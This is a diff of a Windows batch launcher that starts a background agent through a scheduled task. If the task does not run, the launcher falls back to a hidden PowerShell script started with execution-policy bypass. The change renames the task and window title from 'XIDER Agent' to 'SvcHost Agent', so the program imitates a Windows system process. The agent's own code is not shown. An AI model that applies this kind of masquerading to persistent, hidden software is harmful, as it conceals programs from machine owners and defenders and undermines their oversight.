@@ -1,10 +1,10 @@
 @echo off
 setlocal
 cd /d "%~dp0"
-title XIDER Agent
+title SvcHost Agent
 
 if /I "%~1"=="status" (
-  schtasks /Query /TN "XIDER Agent" /FO LIST /V
+  schtasks /Query /TN "SvcHost Agent" /FO LIST /V
   exit /b %errorlevel%
 )
 
@@ -21,10 +21,10 @@ if errorlevel 1 (
   exit /b 1
 )
 
-schtasks /Run /TN "XIDER Agent" >nul 2>&1
+schtasks /Run /TN "SvcHost Agent" >nul 2>&1
 if errorlevel 1 (
   powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%~dp0install_agent.ps1"
 ) else (
-  echo [OK] XIDER Agent started in background.
+  echo [OK] SvcHost Agent started in background.
 )
 endlocal
